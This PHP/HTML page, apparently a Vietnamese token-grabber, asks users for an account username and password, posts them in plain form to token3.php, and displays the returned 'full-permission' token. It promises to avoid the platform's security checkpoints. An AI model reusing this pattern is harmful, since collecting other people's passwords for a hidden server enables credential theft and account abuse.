<?php
include '../system/head.php';
?>
<div class="container">
  <h2>Get Token iPhone Full Quyền</h2>
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">Không Bị Checkpoint 100%</div>
      <div class="panel-body">      
<div class="form-group">
  <label for="usr">Username:</label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
  <label for="pwd">Password:</label>
  <input type="password" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Cài Đặt và Lấy Token</button>
<p>
<li id="trave" class="list-group-item" style="background: #fff;"><img src="http://i.imgur.com/4xwpZzp.png" style="max-width:100%;"> </li></p>

</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>
<?php include 'system/foot.php'; ?>
</body>
</html>